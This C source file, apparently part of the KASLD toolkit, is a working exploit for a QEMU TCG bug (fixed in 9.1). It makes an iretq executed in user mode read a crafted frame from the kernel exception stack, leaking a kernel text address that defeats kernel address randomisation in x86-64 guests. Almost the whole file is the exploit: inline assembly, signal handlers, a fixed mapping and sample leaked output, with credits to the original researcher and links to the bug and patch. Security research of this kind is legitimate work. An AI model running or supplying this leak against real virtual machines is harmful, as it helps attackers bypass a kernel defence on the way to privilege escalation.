// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel stack address inside a QEMU (<9.1) guest (x86-64) using `iret`.
//
// The QEMU TCG (Tiny Code Generator) implementation assumes the iret and
// call far (retf) instructions are only used to transition between privilege
// rings (ie, ring 0 -> ring 3). When a user-space program (ring 3) executes
// iret to stay in ring 3 while setting new cs/ss values, QEMU incorrectly
// accesses the stack as if the current privilege level is 0 - meaning it
// reads/writes from the kernel stack instead of the user stack.
//
// Patched in QEMU version 9.1.
//
// Uses and largely based on original code by @_leave07:
// https://kqx.io/post/qemu-nday/#leak-exploit
//
// Output:
// [.] trying QEMU TCG iret leak ...
// leaked kernel stack address: ffffffff9880105f
// possible kernel base: ffffffff98800000
//
// References:
// https://kqx.io/post/qemu-nday/#leak-exploit
// https://bugs.launchpad.net/qemu/+bug/1866892
// https://gitlab.com/qemu-project/qemu/-/commit/0bd385e7e3c33e987d7a8879918be6df7b111ac4
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported (x86-64 only)"
#endif

#include "include/kasld.h"
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

uint64_t kbase;
static sigjmp_buf env;

// SIGFPE handler: triggered by the intentional div-by-zero in kaslr().
// Advances RIP past the 3-byte `div rax` instruction so execution
// continues with the sgdt/iretq sequence.
void sigfpe_handler(int sig, siginfo_t *si, void *context) {
  (void)sig;
  (void)si;
  ucontext_t *uc = (ucontext_t *)context;

  uc->uc_mcontext.gregs[REG_RIP] += 3;
}

// SIGSEGV handler: triggered after iretq jumps to the unmapped user-space
// address (0x133a000). Due to the QEMU bug, the iret frame was read from
// the kernel exception stack, so RIP here contains a kernel .text address
// (the exception handler return address) leaked from the kernel stack.
void sigsegv_handler(int sig, siginfo_t *si, void *context) {
  (void)sig;
  (void)si;
  ucontext_t *uc = (ucontext_t *)context;

  kbase = (uint64_t)uc->uc_mcontext.gregs[REG_RIP];

  siglongjmp(env, 1);
}

void kaslr() {
  __asm__ volatile(
      ".intel_syntax noprefix\n"

      // Step 1: Prepare a fake iret frame in registers R15-R12.
      // When the div-by-zero fault fires, these callee-saved regs
      // are pushed onto the kernel exception stack, forming a valid
      // user-mode iret frame: {RIP=0x133a000, CS=0x33, RFLAGS=0x206,
      // RSP=unused, SS=0x2b}.
      "mov r15, 0x33\n"      // CS: user-mode code segment
      "mov r14, 0x206\n"     // RFLAGS: IF set
      "mov r13, 0x133a000\n" // RIP: target address (unmapped)
      "mov r12, 0x2b\n"      // SS: user-mode stack segment

      // Step 2: Trigger a divide-by-zero exception.
      // The SIGFPE handler advances RIP past this instruction.
      // The fault pushes R15-R12 (the fake iret frame) onto the
      // kernel exception stack.
      "mov rax, 0\n"
      "div rax\n"

      // Step 3: Use `sgdt` (executable from ring 3) to leak the
      // GDT base address, then compute the address on the kernel
      // exception stack where the fault handler's return address
      // (a kernel .text pointer) sits just above our fake iret frame.
      "push rax\n"
      "sgdt [rsp]\n"
      "mov rax, qword [rsp+2-8]\n" // GDT base address
      "add rax, 0x1f50\n"          // offset to iret frame on exception stack
      "mov rsp, rax\n"

      // Step 4: Execute iretq. Due to the QEMU bug, iretq in ring 3
      // reads the frame from the kernel stack (where RSP now points)
      // instead of the user stack. It pops our fake frame values,
      // jumping to 0x133a000 which is unmapped, triggering SIGSEGV.
      // The SIGSEGV handler captures the leaked kernel address from
      // the signal context.
      "iretq\n"
      ".att_syntax noprefix\n");
}

uint64_t get_kernel_stack_addr_using_qemu_tcg_iret() {
  printf("[.] trying QEMU TCG iret leak ...\n");

  // Install SIGFPE handler to recover from the intentional div-by-zero
  struct sigaction sa_fpe = {0};
  sa_fpe.sa_sigaction = sigfpe_handler;
  sa_fpe.sa_flags = SA_SIGINFO;
  sigaction(SIGFPE, &sa_fpe, NULL);

  // Set up an alternate signal stack so the SIGSEGV handler can run even
  // when RSP has been corrupted to a kernel address (which happens on
  // non-vulnerable systems where iretq faults before restoring a valid RSP).
  stack_t ss;
  ss.ss_sp = malloc(SIGSTKSZ);
  ss.ss_size = SIGSTKSZ;
  ss.ss_flags = 0;
  sigaltstack(&ss, NULL);

  // Install SIGSEGV handler to capture the leaked kernel address
  struct sigaction sa_segv = {0};
  sa_segv.sa_sigaction = sigsegv_handler;
  sa_segv.sa_flags = SA_SIGINFO | SA_ONSTACK;
  sigemptyset(&sa_segv.sa_mask);
  sigaction(SIGSEGV, &sa_segv, NULL);

  // Pre-map the stack region used after iretq jumps to 0x133a000.
  // The SIGSEGV handler needs a valid stack; this growsdown mapping
  // at 0x1338000 provides it (adjacent to the 0x133a000 target).
  mmap((void *)0x1338000, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_POPULATE,
       -1, 0);

  if (sigsetjmp(env, 1) == 0) {
    kaslr();
  }

  if (kbase >= KERNEL_BASE_MIN && kbase <= KERNEL_BASE_MAX) {
    printf("leaked kernel stack address: %lx\n", kbase);
    return kbase;
  }

  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_stack_addr_using_qemu_tcg_iret();

  if (!addr) {
    printf("[-] QEMU TCG IRET fault not triggered\n");
    return 0;
  }

  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "qemu-tcg-iret");

  return 0;
}
